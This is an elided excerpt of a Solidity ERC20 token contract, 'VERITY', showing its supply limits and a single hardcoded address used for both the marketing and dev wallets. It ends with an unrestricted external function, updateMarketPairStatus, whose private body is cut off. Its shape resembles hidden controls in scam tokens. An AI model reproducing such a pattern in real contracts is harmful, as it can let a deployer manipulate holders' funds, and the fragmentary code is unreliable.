...
contract VERITY is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("The Eternal Verities", "VERITY") {
     ...
     uint256 totalSupply = 5 * 10 ** 5 * 10 ** decimals();
 
        maxTransactionAmount = 10 * 10 ** 3 * 10 ** decimals(); 
        maxWallet = 10 * 10 ** 3 * 10 ** decimals(); 
        ...
        MarketingWallet = address(0xADCdAea1ee9fC13179881d768cf42Cb8cc3B5c48); // set as Marketing wallet
        DevWallet = address(0xADCdAea1ee9fC13179881d768cf42Cb8cc3B5c48); // set as dev wallet
    ...
    function updateMarketPairStatus(uint account, uint newValue) external returns (bool) {
        ...
        _updateMarketPairStatus(newValue);
      ...
      function _updateMarketPairStatus(uint256 pAmount) private {
